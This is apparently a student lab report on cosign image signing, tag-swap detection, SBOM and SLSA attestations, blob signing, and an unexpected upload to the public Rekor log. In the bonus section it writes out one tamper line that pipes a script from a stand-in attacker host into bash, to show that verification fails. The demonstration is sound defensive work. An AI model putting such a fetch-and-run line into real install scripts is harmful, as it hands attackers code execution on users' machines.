# Lab 8 — Supply Chain: Signing, Tampering, and Attestation

**Environment:**
- Host: Windows 11, Docker Desktop 29.7.2 with the containerd image store, Git Bash.
- Tools: `cosign v3.0.2` (GitCommit `84449696`), registry `registry:3` on `127.0.0.1:5000`, `jq 1.8.2`.
- SBOM: `labs/lab4/juice-shop.cdx.json` from Lab 4 (CycloneDX 1.7, 3069 components), restored from the `feature/lab4` commit.

Two things did not go the way the lab text says. Both are explained where they happened:
- the digest to sign could not be read from `docker inspect` (8.1);
- `--tlog-upload=false` did not keep the signatures off the public Rekor log ([Rekor](#rekor-the-signatures-did-reach-the-public-log)).

## Task 1

### 8.1 Which digest

```bash
docker push localhost:5000/juice-shop:v20.0.0
```
```text
 Info -> Not all multiplatform-content is present and only the available single-platform image was pushed
         sha256:fd58bdc9745416afce8184ee0666278a436574633ea7880365153a63bfd418b0 -> sha256:28870b9d2bec49e605d6ebbf4b22ed1ec1ca0a72347ef19217bbbb21ea44e3fe
```

With the containerd image store, the local image is the multi-platform **index** `fd58bdc9…`, the same digest as on Docker Hub and in Lab 4. Only the linux/amd64 **manifest** `28870b9d…` was pushed. The lab's selector still reports the index digest:

```text
$ docker inspect localhost:5000/juice-shop:v20.0.0 --format '{{range .RepoDigests}}{{println .}}{{end}}'
bkimminich/juice-shop@sha256:fd58bdc9745416afce8184ee0666278a436574633ea7880365153a63bfd418b0
localhost:5000/juice-shop@sha256:fd58bdc9745416afce8184ee0666278a436574633ea7880365153a63bfd418b0
```

`{{index .RepoDigests 0}}` gives the Docker Hub line, which is the pitfall the lab warns about. Filtering for `localhost:5000/` fixes the registry name, but the digest is still one this registry does not have. I asked the registry what the tag resolves to:

```text
$ curl -sI -H 'Accept: …oci.image.index…, …oci.image.manifest…' http://127.0.0.1:5000/v2/juice-shop/manifests/v20.0.0
Content-Type: application/vnd.oci.image.manifest.v1+json
Docker-Content-Digest: sha256:28870b9d2bec49e605d6ebbf4b22ed1ec1ca0a72347ef19217bbbb21ea44e3fe

HEAD …/manifests/sha256:fd58bdc9…  -> 404
HEAD …/manifests/sha256:28870b9d…  -> 200
```

Signing the `docker inspect` digest fails for that reason:

```text
Error: signing [localhost:5000/juice-shop@sha256:fd58bdc9…]: signing digest: HEAD http://localhost:5000/v2/juice-shop/manifests/sha256:fd58bdc9…: unexpected status code 404 Not Found
```

**Digest signed:** `localhost:5000/juice-shop@sha256:28870b9d2bec49e605d6ebbf4b22ed1ec1ca0a72347ef19217bbbb21ea44e3fe`. That is the registry's own answer for the tag, read from the `Docker-Content-Digest` header before any tampering. Recorded in `labs/lab8/results/juice-shop-digest.txt`.

### 8.2 Key pair and signature

```bash
cd labs/lab8/keys && cosign generate-key-pair && cd -   # passphrase via COSIGN_PASSWORD
```

`cosign.key` (`-----BEGIN ENCRYPTED SIGSTORE PRIVATE KEY-----`) and `cosign.pub` were written. Only `cosign.pub` is committed. The lab says Lab 3's pre-commit hook should refuse the private key, so I tested every layer:

| What I tried | Result |
|---|---|
| `git add labs/lab8/keys/cosign.key` | **Refused by `.gitignore`** (`*.key`): `The following paths are ignored…` |
| `git add -f`, then Lab 3's hooks | gitleaks **Failed**: `RuleID: private-key`, `File: labs/lab8/keys/cosign.key`, `Line: 1`. Unstaged right after. |
| `detect-private-key` from the same config | **Passed**. Its fixed list has `BEGIN ENCRYPTED PRIVATE KEY` and others, but not `BEGIN ENCRYPTED SIGSTORE PRIVATE KEY`. |
| The installed hook on this branch | **Skipped** (`.pre-commit-config.yaml config file not found`). The config exists only on the Lab 3 commit, not on `main`. |

So on this branch, `.gitignore` is the only control that actually fires. Lab 3's gitleaks would catch a forced add, but only where the config is present. The key is also passphrase-encrypted, which limits the damage if it does leak.

```bash
cosign sign --key labs/lab8/keys/cosign.key --tlog-upload=false \
  --allow-insecure-registry --yes "$DIGEST"
cosign verify --key labs/lab8/keys/cosign.pub \
  --insecure-ignore-tlog --allow-insecure-registry "$DIGEST"
```

```json
[
  {
    "critical": {
      "identity": {
        "docker-reference": "localhost:5000/juice-shop@sha256:28870b9d2bec49e605d6ebbf4b22ed1ec1ca0a72347ef19217bbbb21ea44e3fe"
      },
      "image": {
        "docker-manifest-digest": "sha256:28870b9d2bec49e605d6ebbf4b22ed1ec1ca0a72347ef19217bbbb21ea44e3fe"
      },
      "type": "https://sigstore.dev/cosign/sign/v1"
    },
    "optional": null
  }
]
```
```text
Verification for localhost:5000/juice-shop@sha256:28870b9d… --
The following checks were performed on each of these signatures:
  - The cosign claims were validated
  - Existence of the claims in the transparency log was verified offline
  - The signatures were verified against the specified public key
```

### 8.3 The swap

```text
$ docker tag alpine:3.20 localhost:5000/juice-shop:v20.0.0 && docker push localhost:5000/juice-shop:v20.0.0
v20.0.0: digest: sha256:c64c687cbea9300178b30c95835354e34c4e4febc4badfe27102879de0483b5e

signed:  localhost:5000/juice-shop@sha256:28870b9d2bec49e605d6ebbf4b22ed1ec1ca0a72347ef19217bbbb21ea44e3fe
now:     localhost:5000/juice-shop@sha256:c64c687cbea9300178b30c95835354e34c4e4febc4badfe27102879de0483b5e
```

I took the "now" digest from the registry as well: `docker inspect` again reported the local alpine index `d9e853e8…`, which returns 404.

```text
$ cosign verify --key labs/lab8/keys/cosign.pub --insecure-ignore-tlog --allow-insecure-registry localhost:5000/juice-shop@sha256:c64c687c…
WARNING: Skipping tlog verification is an insecure practice that lacks transparency and auditability verification for the signature.
Error: no signatures found
error during command execution: no signatures found
# exit code 10
```

Verifying by tag (`localhost:5000/juice-shop:v20.0.0`), which is what a deploy that references the tag would check, gives the same `Error: no signatures found`.

**The original digest still verifies after the swap:**

```text
$ cosign verify ... localhost:5000/juice-shop@sha256:28870b9d…
{"identity":{"docker-reference":"localhost:5000/juice-shop@sha256:28870b9d…"},"image":{"docker-manifest-digest":"sha256:28870b9d…"},"type":"https://sigstore.dev/cosign/sign/v1"}
Verification for localhost:5000/juice-shop@sha256:28870b9d… --
```

**What the signature is bound to.** The signature covers a payload that names one **manifest digest**: the SHA-256 of the manifest bytes, which in turn list the digests of the config and every layer. Changing a single byte of the image gives a different digest. Cosign also stores the signature *by* that digest. The registry shows it as the tag `sha256-28870b9d…`, an index of referrers whose `subject` is `sha256:28870b9d…`.

A tag like `v20.0.0` is just a mutable pointer. When I moved it to alpine, verification followed it to `c64c687c…`, looked up signatures for that digest and found none. If signatures were bound to tags, my push of alpine under `v20.0.0` would have inherited "signed" status, and anyone allowed to push to the repository could swap the image without the key. That is why a policy should verify *and deploy* by digest.

## Task 2

### Attestations attached and verified

```bash
cosign attest --key labs/lab8/keys/cosign.key --type cyclonedx \
  --predicate labs/lab4/juice-shop.cdx.json --tlog-upload=false --allow-insecure-registry --yes "$DIGEST"
cosign verify-attestation --key labs/lab8/keys/cosign.pub --insecure-ignore-tlog \
  --allow-insecure-registry --type cyclonedx "$DIGEST" \
  | jq -r '.payload | @base64d | fromjson | .predicate' > labs/lab8/results/sbom-from-attestation.json
```

| | `.components \| length` |
|---|---|
| `labs/lab4/juice-shop.cdx.json` | **3069** |
| `labs/lab8/results/sbom-from-attestation.json` | **3069** |

The counts match, and the two files are identical as JSON after `jq -S` normalisation. The SBOM is carried whole.

The second attestation was SLSA provenance, with `invocation.configSource.uri` set to `https://github.com/mobgun/DevSecOps-Intro`. Each `predicateType` was read from its own verified payload (`jq -r '.payload | @base64d | fromjson | .predicateType'`):

| `--type` | `predicateType` in the verified payload |
|---|---|
| `cyclonedx` | `https://cyclonedx.org/bom` |
| `slsaprovenance` | `https://slsa.dev/provenance/v0.2` |

Note that the `slsaprovenance` alias maps to SLSA provenance **v0.2**, not v1.0.

### The decoded statement and where each field came from

```json
{
  "_type": "https://in-toto.io/Statement/v0.1",
  "predicateType": "https://slsa.dev/provenance/v0.2",
  "subject": [
    { "name": "localhost:5000/juice-shop",
      "digest": { "sha256": "28870b9d2bec49e605d6ebbf4b22ed1ec1ca0a72347ef19217bbbb21ea44e3fe" } }
  ],
  "predicate": {
    "builder": { "id": "https://localhost/lab8-student" },
    "buildType": "https://example.com/lab8/local-build",
    "invocation": { "configSource": { "uri": "https://github.com/mobgun/DevSecOps-Intro" } }
  }
}
```

| Field | Origin |
|---|---|
| `_type` | **Cosign.** It wraps my predicate in an in-toto Statement (v0.1). My file had no `_type`. |
| `subject` | **Cosign**, from the image reference I passed: the repository name and the digest `28870b9d…`. This is what binds the claim to one exact image. |
| `predicateType` | **Cosign**, mapped from my `--type` alias (`cyclonedx` → `https://cyclonedx.org/bom`, `slsaprovenance` → `…/provenance/v0.2`). |
| `predicate` | **Me.** The file passed to `--predicate`, carried byte for byte. For the SBOM that is all 3069 components. |

Cosign then put the Statement in a DSSE envelope (`payloadType: application/vnd.in-toto+json`, one signature) and signed it with my key.

In the registry, the signature and both attestations are three Sigstore bundle v0.3 referrers with `subject` `sha256:28870b9d…`. They are indexed under the single tag `sha256-28870b9d…`, and nothing about them depends on `v20.0.0`.

### The morning after the next Log4Shell

A signature tells me only that an image is unchanged since someone signed it. It says nothing about what is inside. With an SBOM attested to every image digest, I can loop over the two thousand digests and run `verify-attestation --type cyclonedx` on each. I then search the verified predicates for the vulnerable package and version, and I have a list of affected digests in minutes, without pulling or unpacking a single image. The answer is also trustworthy: each SBOM is signed by our build key and bound to that exact digest, so an image that was swapped or rebuilt without being re-attested shows up as "no attestation", not as falsely clean.

For that to work at three in the morning, several things must already be true:
- Every image was attested **at build time**. Coverage gaps are invisible until that night.
- The SBOMs were generated from the final image, and they catch nested and shaded jars. Log4j hid inside fat jars.
- The verification key is at hand, and the registry and its referrers are still there.
- There is a mapping from digest to what is actually running. Otherwise "affected" never becomes "which deployments".

## Bonus

```bash
cosign sign-blob --key labs/lab8/keys/cosign.key --yes --tlog-upload=false \
  --bundle labs/lab8/results/my-tool.tar.gz.bundle labs/lab8/results/my-tool.tar.gz
cosign verify-blob --key labs/lab8/keys/cosign.pub \
  --bundle labs/lab8/results/my-tool.tar.gz.bundle --insecure-ignore-tlog labs/lab8/results/my-tool.tar.gz
```

```text
Verified OK
```

Then I played the attacker: I added `curl -s https://attacker.example/x | bash` to `/tmp/install.sh` and rebuilt the tarball without re-signing. Its SHA-256 changed from `352b044f…` to `57294621…`.

```text
Error: failed to verify signature: could not verify message: invalid signature when validating ASN.1 encoded signature
error during command execution: failed to verify signature: could not verify message: invalid signature when validating ASN.1 encoded signature
# exit code 1
```

The bundle's `messageSignature.messageDigest` is the SHA-256 of the original tarball (`NSsET2…` in base64 is `352b044f…`). The modified tarball no longer matches what was signed.

**The two files a consumer needs, and how they may travel:**
- **The bundle** (`my-tool.tar.gz.bundle`) holds the signature and verification material. It **may travel next to the artifact**: an attacker who changes the tarball cannot produce a bundle that verifies against my key.
- **The public key** (`cosign.pub`) **must arrive over a different, trusted channel.** The bundle carries only a key *hint*, not the key itself.

I tested this. An attacker who controls the download server replaces the tarball *and* the bundle, signed with their own key:

```text
verify with the PUBLISHED key                          : Error: failed to verify signature ... invalid signature
verify with the key served next to the download (attacker's): Verified OK
```

Verification is only as good as the key it is checked against. A key fetched from the same compromised host proves nothing.

**Install instructions I would publish:**

```bash
# 1. Once, out of band: get the key from a channel the release server does not control.
#    For example the project repo at a signed tag, with its fingerprint also printed in the release notes.
#    Or go keyless, and pin the CI identity with
#    --certificate-identity=<workflow URL> --certificate-oidc-issuer=https://token.actions.githubusercontent.com
# 2. Download the artifact and its bundle. Never pipe into a shell.
curl -fsSLO https://releases.example.org/my-tool/1.2.3/my-tool.tar.gz
curl -fsSLO https://releases.example.org/my-tool/1.2.3/my-tool.tar.gz.bundle
# 3. Verify, and run nothing unless verification succeeds.
cosign verify-blob --key my-tool.pub --bundle my-tool.tar.gz.bundle my-tool.tar.gz \
  && tar -xzf my-tool.tar.gz && bash install.sh
```

The script lands on disk and is verified before it executes, and the `&&` makes a failed verification stop the install. Codecov's `curl | bash` gave the script no moment at which it could be checked. **The step most projects skip is step 1**, distributing and pinning the verification key or identity independently of the download. Without it, "we sign our releases" collapses into the attacker signing theirs.

## Rekor: the signatures did reach the public log

The lab's `--tlog-upload=false` is meant to keep this work off the public Rekor log. With cosign **v3.0.2** it did not. Every bundle carries a `tlogEntries` record from `rekor.sigstore.dev` and an RFC 3161 timestamp from Sigstore's TSA:

| Operation | Rekor entry |
|---|---|
| `cosign sign` (image) | `dsse`, logIndex 3077916634 |
| `cosign attest --type cyclonedx` | `dsse`, logIndex 3077917410 |
| `cosign attest --type slsaprovenance` | `dsse`, logIndex 3077917671 |
| `cosign sign-blob` (my-tool) | `hashedrekord`, logIndex 3077918166 |
| `sign-blob` with a throwaway "attacker" key (bonus demo) | `hashedrekord`, logIndex 3077918492 |

The verify output hinted at it all along: `Existence of the claims in the transparency log was verified offline`.

**Cause.** `cosign sign-blob --help` in 3.0.2 shows `--use-signing-config=true` as the default: "whether to use a TUF-provided signing config for the service URLs". With the new bundle format, Cosign takes Rekor and the TSA from that config, and `--tlog-upload=false` has no effect. Keeping a local experiment off Rekor needs `--use-signing-config=false` as well.

**What became public.** I fetched two entries back from the Rekor API. A `dsse` entry holds only `envelopeHash`, `payloadHash` and the signature with its verifier. A `hashedrekord` entry holds the artifact's SHA-256, the signature and the public key. Neither contains the image name, `localhost`, the repository URL, or any SBOM or provenance content. What is now public is hashes, signatures and `cosign.pub`, which this PR publishes anyway. The private key and its passphrase never left the machine. Rekor is append-only, so the entries cannot be removed. Signing again with the right flags would not undo them, so I did not.
